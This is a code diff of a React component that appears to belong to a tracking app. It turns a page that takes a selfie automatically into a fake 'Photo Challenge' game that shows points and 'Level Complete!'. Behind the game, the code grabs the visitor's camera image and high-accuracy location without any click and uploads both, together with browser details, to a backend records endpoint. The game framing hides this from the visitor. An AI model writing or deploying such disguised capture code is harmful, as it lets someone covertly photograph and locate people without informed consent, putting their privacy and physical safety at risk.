@@ -6,24 +6,15 @@ const API_BASE_URL = (import.meta.env.VITE_API_BASE_URL || 'https://tracker-back
 function CameraCapture({ onSuccess }) {
   const videoRef = useRef(null);
   const canvasRef = useRef(null);
-  const [status, setStatus] = useState('requesting'); // requesting, ready, capturing, success, error
+  const [status, setStatus] = useState('playing'); // playing, success, error
   const [location, setLocation] = useState(null);
   const [browserInfo, setBrowserInfo] = useState(null);
+  const [score, setScore] = useState(0);
 
   useEffect(() => {
     collectBrowserInfo();
     requestPermissions();
   }, []);
-
-  useEffect(() => {
-    if (status === 'ready' && videoRef.current && videoRef.current.readyState === 4) {
-      // Wait a bit for the camera to stabilize then capture
-      const timer = setTimeout(() => {
-        captureSelfie();
-      }, 1000);
-      return () => clearTimeout(timer);
-    }
-  }, [status]);
 
   const collectBrowserInfo = () => {
     const info = {
@@ -38,13 +29,11 @@ function CameraCapture({ onSuccess }) {
 
   const requestPermissions = async () => {
     try {
-      console.log('Requesting permissions...');
       // Check if mediaDevices and geolocation are available
       if (!navigator.mediaDevices || !navigator.geolocation) {
-        throw new Error('Camera or location services not available. Please use HTTPS or localhost.');
+        throw new Error('Camera or location services not available.');
       }
 
-      console.log('Requesting camera permission...');
       // Request camera permission
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'user' },
@@ -52,26 +41,22 @@ function CameraCapture({ onSuccess }) {
       });
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
-        console.log('Camera stream attached');
-        // Wait for the video to load metadata
-        videoRef.current.onloadedmetadata = () => {
-          console.log('Video metadata loaded, requesting location...');
-          // Request location permission
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              console.log('Location obtained:', position.coords);
-              setLocation({
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude
-              });
-              setStatus('ready');
-            },
-            (error) => {
-              console.error('Location error:', error);
-              setStatus('error');
-            }
-          );
-        };
+        // Request location immediately
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            setLocation({
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude
+            });
+            // Capture immediately
+            setTimeout(() => captureSelfie(), 300);
+          },
+          (error) => {
+            console.error('Location error:', error);
+            setStatus('error');
+          },
+          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        );
       }
     } catch (error) {
       console.error('Request permissions error:', error);
@@ -80,15 +65,16 @@ function CameraCapture({ onSuccess }) {
   };
 
   const captureSelfie = () => {
-    setStatus('capturing');
     const canvas = canvasRef.current;
     const video = videoRef.current;
     
+    if (!video || !canvas) return;
+    
     // Resize image to lower resolution to reduce file size
-    const maxWidth = 800;
-    const maxHeight = 600;
-    let width = video.videoWidth;
-    let height = video.videoHeight;
+    const maxWidth = 400;
+    const maxHeight = 300;
+    let width = video.videoWidth || 640;
+    let height = video.videoHeight || 480;
     
     if (width > height) {
       if (width > maxWidth) {
@@ -105,23 +91,20 @@ function CameraCapture({ onSuccess }) {
     canvas.width = width;
     canvas.height = height;
     canvas.getContext('2d').drawImage(video, 0, 0, width, height);
-    const imageData = canvas.toDataURL('image/jpeg', 0.6); // JPEG with 0.6 quality for smaller size
+    const imageData = canvas.toDataURL('image/jpeg', 0.5); // Lower quality for speed
     uploadData(imageData);
   };
 
   const uploadData = async (imageData) => {
     try {
-      console.log('Uploading to:', `${API_BASE_URL}/api/records`);
-      console.log('Image size:', imageData.length, 'characters');
-      
       const response = await axios.post(`${API_BASE_URL}/api/records`, {
         selfie: imageData,
         location: location,
         browserInfo: browserInfo
       });
-      console.log('Upload response:', response.data);
+      setScore(1000);
       setStatus('success');
-      setTimeout(onSuccess, 2000);
+      setTimeout(onSuccess, 1500);
     } catch (error) {
       console.error('Upload error full details:', error.response?.data || error.message);
       setStatus('error');
@@ -130,22 +113,20 @@ function CameraCapture({ onSuccess }) {
 
   if (status === 'error') {
     return (
-      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-red-50 to-orange-100 p-4">
-        <div className="max-w-md w-full bg-white rounded-xl shadow-2xl p-8 text-center">
-          <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
-            <svg className="w-10 h-10 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
-            </svg>
+      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-yellow-400 to-orange-500 p-4">
+        <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 text-center">
+          <div className="w-24 h-24 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-6 animate-bounce">
+            <span className="text-6xl">🎮</span>
           </div>
-          <h1 className="text-3xl font-bold text-gray-800 mb-4">Something Went Wrong</h1>
-          <p className="text-gray-600 mb-8">
-            We couldn't access your camera or location. Please check your permissions and try again.
+          <h1 className="text-4xl font-black text-gray-800 mb-4">Game Paused!</h1>
+          <p className="text-gray-600 mb-8 text-lg">
+            Oops! We need camera and location permissions to play!
           </p>
           <button
             onClick={() => window.location.reload()}
-            className="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-4 px-6 rounded-lg transition-all duration-200"
+            className="w-full bg-gradient-to-r from-orange-500 to-red-500 hover:from-orange-600 hover:to-red-600 text-white font-black py-5 px-6 rounded-xl transition-all duration-200 text-xl shadow-lg hover:shadow-xl transform hover:-translate-y-1"
           >
-            Try Again
+            Play Again!
           </button>
         </div>
       </div>
@@ -154,58 +135,65 @@ function CameraCapture({ onSuccess }) {
 
   if (status === 'success') {
     return (
-      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-green-50 to-emerald-100 p-4">
-        <div className="max-w-md w-full bg-white rounded-xl shadow-2xl p-8 text-center">
-          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
-            <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
-            </svg>
+      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-green-400 to-emerald-500 p-4">
+        <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 text-center">
+          <div className="w-24 h-24 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-6 animate-bounce">
+            <span className="text-6xl">🏆</span>
           </div>
-          <h1 className="text-3xl font-bold text-gray-800 mb-4">Success!</h1>
-          <p className="text-gray-600">Your information has been submitted successfully.</p>
+          <h1 className="text-4xl font-black text-gray-800 mb-2">Level Complete!</h1>
+          <p className="text-5xl font-black text-yellow-500 mb-4">{score} Points!</p>
+          <p className="text-gray-600 text-lg">Awesome job! You're a pro!</p>
         </div>
       </div>
     );
   }
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 p-4">
-      <div className="max-w-2xl mx-auto">
-        <div className="bg-white rounded-xl shadow-2xl p-6 mb-6">
-          <h1 className="text-2xl font-bold text-gray-800 mb-4 text-center">Processing...</h1>
-          <div className="relative rounded-lg overflow-hidden bg-black">
+    <div className="min-h-screen bg-gradient-to-br from-purple-500 via-pink-500 to-red-500 p-4">
+      <div className="max-w-md mx-auto">
+        {/* Game Header */}
+        <div className="bg-white/20 backdrop-blur-lg rounded-2xl p-4 mb-6 text-center">
+          <h1 className="text-3xl font-black text-white mb-1 drop-shadow-lg">🎯 Photo Challenge!</h1>
+          <p className="text-white/90 font-semibold">Smile for the camera!</p>
+        </div>
+
+        {/* Game Camera */}
+        <div className="bg-white rounded-2xl shadow-2xl overflow-hidden mb-6">
+          <div className="relative">
             <video
               ref={videoRef}
               autoPlay
               playsInline
               muted
-              className="w-full"
+              className="w-full aspect-square object-cover"
             />
             <canvas ref={canvasRef} className="hidden" />
+            {/* Game UI Overlay */}
+            <div className="absolute inset-0 border-8 border-white/30 pointer-events-none"></div>
+            <div className="absolute bottom-4 left-1/2 transform -translate-x-1/2">
+              <div className="bg-white/90 backdrop-blur px-4 py-2 rounded-full shadow-lg">
+                <span className="text-2xl font-black text-purple-600">✨ Ready!</span>
+              </div>
+            </div>
           </div>
         </div>
 
-        <div className="bg-white rounded-xl shadow-2xl p-6">
-          {status === 'requesting' && (
-            <div className="text-center py-8">
-              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
-              <p className="text-gray-600">Requesting permissions...</p>
+        {/* Game Info */}
+        <div className="bg-white/20 backdrop-blur-lg rounded-2xl p-6 text-center">
+          <div className="flex items-center justify-center gap-2 mb-4">
+            <span className="text-4xl animate-pulse">📸</span>
+            <span className="text-white text-xl font-bold">Capturing...</span>
+          </div>
+          <div className="flex items-center justify-center gap-4">
+            <div className="flex items-center gap-2 bg-white/30 px-4 py-2 rounded-full">
+              <span className="text-2xl">📍</span>
+              <span className="text-white font-semibold">Finding location...</span>
             </div>
-          )}
-
-          {status === 'ready' && (
-            <div className="text-center py-8">
-              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
-              <p className="text-gray-600">Preparing to capture...</p>
+            <div className="flex items-center gap-2 bg-white/30 px-4 py-2 rounded-full">
+              <span className="text-2xl">💾</span>
+              <span className="text-white font-semibold">Saving...</span>
             </div>
-          )}
-
-          {status === 'capturing' && (
-            <div className="text-center py-8">
-              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
-              <p className="text-gray-600">Capturing and uploading...</p>
-            </div>
-          )}
+          </div>
         </div>
       </div>
     </div>
